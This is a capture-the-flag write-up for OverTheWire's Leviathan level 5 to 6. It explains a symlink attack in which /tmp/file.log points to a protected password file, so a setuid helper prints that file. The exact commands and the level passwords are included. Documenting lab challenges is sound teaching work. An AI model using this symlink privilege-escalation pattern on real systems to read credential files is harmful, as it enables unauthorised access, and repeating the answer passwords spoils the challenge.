# Leviathan Level 05 to 06

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Leviathan |
| Level | 5 -> 6 |
| Status | Complete |

## Objective

Recover the password for `leviathan6` by controlling `/tmp/file.log`.

## Given Access

User: `leviathan5`

Password:

```text
0dyxT7F4QD
```

## Recon

`strings` on the setuid binary `leviathan5` reveals a hard-coded dependency on `/tmp/file.log`.

## Method

The program opens `/tmp/file.log`, reads and prints it, then unlinks the file. Make `/tmp/file.log` a symlink to `/etc/leviathan_pass/leviathan6` before executing the helper.

When the helper runs with elevated privileges, it follows the symlink, prints the password, and deletes the symlink afterward.

## Commands

```bash
ssh -p 2223 leviathan5@leviathan.labs.overthewire.org
strings -a leviathan5
rm -f /tmp/file.log
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

## Result

Password for `leviathan6`:

```text
szo7HDB88w
```

After execution, `/tmp/file.log` is gone because the helper unlinks it.

## Lesson

Predictable temporary-file paths are dangerous, especially in privileged programs. Symlink attacks remain a classic local-privilege-escalation pattern for exactly this reason.

## References

- https://overthewire.org/wargames/leviathan/
